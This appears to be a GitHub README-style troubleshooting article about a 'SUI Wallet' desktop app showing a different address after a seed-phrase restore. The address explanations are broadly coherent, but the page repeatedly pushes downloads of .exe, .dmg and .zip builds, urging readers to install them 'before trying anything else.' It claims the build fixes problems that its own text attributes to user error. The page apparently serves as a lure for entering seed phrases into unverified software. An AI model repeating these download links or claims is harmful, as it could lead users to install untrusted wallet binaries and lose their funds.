![SUI Wallet](assets/banner-article.png)

# SUI Wallet shows the wrong address after restore

A restore that opens a different address is usually a phrase problem, not a wallet problem.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The address is derived from the 24 words, so the same phrase always produces the same address - unless the
phrase differs by one word, the word order changed, or the phrase came from a different kind of account.
Compare the words against the paper copy rather than against memory, then look at what the account was.

## Why a phrase produces exactly one address

The account is not stored anywhere: it is computed. The 24 words are fed through a fixed derivation, and the
result is the address you see. Nothing random is involved, so a second copy of the same phrase on another
machine produces the same address, character for character.

That is the property that makes restoring meaningful at all. If addresses were assigned, a phrase would be a
username rather than a key, and recovery would depend on a server.

## The three ways a phrase differs

A phrase differs from the original in one of three ways, and each produces a valid but different account rather than an error: a misspelled word, two words out of order, or a phrase from a different backup entirely. Nothing on the screen distinguishes them.

1. **A misspelled word.** BIP39 words are chosen so a typo lands on a different dictionary word; the restore
   succeeds and derives a different address.
2. **Reordered words.** Two words swapped is a different phrase, and the account derived from it is real,
   empty and not yours.
3. **A different phrase entirely.** An older backup, a second account, or a phrase from another tool.

The check is the same for all three: put the paper copy beside the screen and compare word by word, not
sentence by sentence.

## What the account was, not just what the phrase says

An address also depends on the kind of account the phrase was used to create. A phrase restored as an
ordinary account produces the ordinary account's address; the same phrase restored into a different kind of
account produces a different address, and both are legitimate.

This is the trap behind "the same words gave me a different address" after a move between wallet
implementations. The words are right and the derivation is different, which means the account you are
looking at is real but is not the one holding the balance.
[Importing an existing Sui account](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/importing-an-existing-sui-account.md) covers what carries across an import and what does not.

## Restoring a staked account

Staking does not change an address. A position belongs to the account that created it, so restoring the phrase shows the same address with the stake still attached once discovery has finished, and a different address means a different phrase.

If the stake is there and the address is unfamiliar, the phrase is the variable - not the staking. Check the
discussion of discovery in [SUI Wallet balance not updating](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-balance-not-updating.md) before concluding anything is missing:
an account that has just been restored reads the chain before it draws conclusions.

## Why an empty address still looks real

Every valid phrase produces a valid address, so a wrong phrase produces one that looks exactly like a right one: right length, right prefix, accepted everywhere. Nothing about the screen distinguishes the two, which is why typing the same thing again rarely helps.

That is also why "new address each time" is usually a report about typing rather than deriving. Each entry
of a slightly different phrase produces a slightly different account, and all of them are real.

The check that separates them is the paper copy, not the screen: a phrase entered from memory has no checksum against memory, while the phrase on paper was written down when the account held nothing and could still be corrected. That is the reason the setup flow insists on writing before funding.

## What to do instead of typing again

Restore once, from the paper copy, and stop. If the address does not match what you expect, do not restore a
third time with the same source: find the original backup, or the machine that still has the account open,
and compare the words there.

The current release is the one to do this on, because the reported problems are fixed there; the
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records what changed in each one.
[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) walks the restore itself, including what the screen shows
between entry and balance.

## FAQ

### Why is the address different after importing a seed phrase?

Because one word differs, the order changed, or the phrase was restored into a different kind of account.
All three produce a valid address, so nothing on the screen warns you.

### Why does importing a seed phrase generate a new address each time?

It does not, if the phrase is identical. A new address on each attempt means the phrase entered differs each
time, usually by a word or an order.

### Why does my restored wallet show a different address?

Either the phrase is not the one that created the account, or the account type differs from the one the
phrase was first used with. Compare against the original backup before trying again.

### How can I retrieve the correct address after restoring a staked account?

Restore the phrase that created the staked position on the current release. Staking does not move an
address, so the correct phrase returns the same address with the stake attached.

### Can I check an address without restoring?

Yes - any explorer shows whether an address holds a balance. That answers "is this the right account" without
changing anything on the machine.

### Is the wrong address dangerous?

Not by itself. It is an account nobody else holds; the risk is sending funds to it by mistake, not losing
what is in the account you meant to open.
